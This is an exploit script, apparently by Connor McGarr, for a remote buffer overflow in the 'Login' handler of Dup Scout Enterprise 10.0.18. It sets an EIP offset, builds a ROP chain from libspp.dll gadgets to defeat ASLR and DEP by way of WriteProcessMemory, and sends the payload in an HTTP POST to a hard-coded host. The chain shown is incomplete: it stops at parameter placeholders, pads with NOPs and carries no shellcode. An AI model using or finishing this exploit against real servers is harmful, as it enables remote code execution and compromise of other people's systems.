# Dup Scount Enterprise 10.0.18 'Login' Remote Buffer Overflow with ASLR/DEP Bypass
# kernel32!WriteProcessMemory
# Author: Connor McGarr (@33y0re)

import socket, os, struct, sys

# Offset to EIP = 780
crash = "\x41" * 780

# Return to the stack
crash += struct.pack('<L', 0x10011208)			# ret: libspp.dll (non-ASLR enabled module)
crash += struct.pack('<L', 0x90909090)			# ROP chain starts @ ESP + 4. Padding to compensate

# Begin ROP chain. In muts we trust.

# Preserve a stack address into EAX and ECX
crash += struct.pack('<L', 0x101291b1)			# pop edx ; sub al, 0x5B ; ret: libspp.dll (non-ASLR enabled module) (Load any writable address into EDX due to the future arbitrary write gadget mov dword [edx], ecx)
crash += struct.pack('<L', 0x101d5030)			# Writable address from .data section of libspp.dll (Will be manipulated to point to a return to the stack gadget)
crash += struct.pack('<L', 0x100cd67c)			# push esp ; mov dword [esi+0x04], 0x00000001 ; mov eax, esi ; pop esi ; ret: libspp.dll (non-ASLR enabled module) (Save ESP into ESI)
crash += struct.pack('<L', 0x100b1712)			# mov eax, esi ; pop esi ; ret: libspp.dll (non-ASLR enabled module) (Save ESP into EAX only)
crash += struct.pack('<L', 0x90909090)			# Compensation for pop esi
crash += struct.pack('<L', 0x1016629c)			# pop ecx ; ret: libspp.dll (non-ASLR enabled module) (Load ECX with an add esp, 0x8 ; ret gadget to compensate for future call dowrd [edx] gadget)
crash += struct.pack('<L', 0x10127c54)			# add esp, 0x08; ret: libspp.dll (non-ASLR enabled module) (Jump over call dowrd [edx]'s return address on the stack to reach next gadget after mov ecx, eax ; call dword [edx])
crash += struct.pack('<L', 0x1014c421)			# mov dword [edx], ecx ; pop ebx ; ret: libspp.dll (non-ASLR enabled module) (Use arbitrary write to load return to stack gadget, add esp 0x8 ; ret, into EDX via a pointer)
crash += struct.pack('<L', 0x90909090)			# Compensate for pop ebx in above ROP gadget
crash += struct.pack('<L', 0x10034088)			# mov ecx, eax ; call dword [edx]: libspp.dll (non-ASLR enabled module) (ESP is saved into EAX and ECX)











# kernel32!WriteProcessMemory parameter placeholders

crash += "\x90" * (10000 - len(crash))

evil =  "POST /login HTTP/1.1\r\n"
evil += "Host: 192.168.228.140\r\n"
evil += "User-Agent: Mozilla/5.0\r\n"
evil += "Connection: close\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-us,en;q=0.5\r\n"
evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
evil += "Keep-Alive: 300\r\n"
evil += "Proxy-Connection: keep-alive\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: 17000\r\n\r\n"
evil += "username=" + crash
evil += "&password=" + crash + "\r\n"

print "[+] Sending exploit..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.142", 80))
s.send(evil)
s.close()
